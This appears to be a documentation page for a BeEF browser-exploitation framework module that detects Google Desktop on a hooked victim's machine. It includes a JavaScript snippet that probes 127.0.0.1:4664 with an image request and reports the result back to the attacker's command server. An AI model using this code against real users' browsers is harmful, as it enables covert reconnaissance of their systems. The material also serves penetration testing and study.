## Summary

* **Objective**: Detect Google Desktop
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/host/detect_google_desktop)

## Internal Working

Uses image tags to detect Google Desktop on port 4664

```js
var dom = document.createElement('b');
var img = new Image;
img.src = "http://127.0.0.1:4664/logo3.gif";
img.onload = function() { beef.net.send('<%= @command_url %>', <%= @command_id %>,'google_desktop=Installed', beef.are.status_success());dom.removeChild(this); }
img.onerror = function() { beef.net.send('<%= @command_url %>', <%= @command_id %>,'google_desktop=Not Installed', beef.are.status_error());dom.removeChild(this); }
dom.appendChild(img);

```

## Feedback

